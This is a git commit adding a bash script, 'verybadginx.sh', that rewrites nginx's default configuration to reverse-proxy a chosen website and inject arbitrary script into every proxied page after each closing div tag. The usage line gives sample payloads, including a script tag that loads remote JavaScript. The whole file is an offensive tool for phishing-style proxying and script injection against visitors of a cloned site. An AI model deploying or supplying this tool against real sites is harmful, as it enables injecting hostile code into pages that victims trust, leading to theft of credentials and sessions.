e9be10d017c4da58281c9081590899a4db55955e
Ug0Security <c.vallicari@gmail.com>
2018-09-12 14:20:52 +0200

    Create verybadginx.sh

---
+++ verybadginx.sh
@@ -0,0 +1,46 @@
+site=$1
+inject=$2
+
+
+if [ $# -eq 0 ]; then
+    echo -n -e "usage :  \e[1;31mbash verybadginx.sh http://www.test.com/ \"<script>alert(1)</script>\"  or \"<script/src='http://www.test.com/test.js'></script>\" \e[0m\n"
+    exit 1
+fi
+
+if [ $# -eq 1 ]; then
+   
+    echo -n -e "\e[1;32m[Reverse Prox to : $site !]\e[0m\n"
+    echo -n -e "\e[1;31m[Aucun Script injecté !]\e[0m\n"
+   
+fi
+
+if [ $# -eq 2 ]; then
+   
+    echo -n -e "\e[1;32m[Reverse Prox to : $site !]\e[0m\n"
+    echo -n -e "\e[1;32m[ Script injecté : $inject !]\e[0m\n"
+   
+fi
+
+trap '{ pkill nginx ; exit 1; }' INT
+
+sed '50 c proxy_pass '$site';' /etc/nginx/sites-available/default > /etc/nginx/sites-available/zizi
+mv /etc/nginx/sites-available/zizi /etc/nginx/sites-available/default
+
+sed '50 c proxy_pass '$site';' /etc/nginx/sites-enabled/default > /etc/nginx/sites-enabled/zizi
+mv /etc/nginx/sites-enabled/zizi /etc/nginx/sites-enabled/default
+
+
+sed  '51 c subs_filter "</div>" "</div>'$inject'" -o;' /etc/nginx/sites-available/default > /etc/nginx/sites-available/zizi
+mv /etc/nginx/sites-available/zizi /etc/nginx/sites-available/default
+
+sed  '51 c subs_filter "</div>" "</div>'$inject'" -o;'  /etc/nginx/sites-enabled/default > /etc/nginx/sites-enabled/zizi
+mv /etc/nginx/sites-enabled/zizi /etc/nginx/sites-enabled/default
+
+
+
+
+nginx
+tail -f /var/log/nginx/access.log
+exit 0
+
+
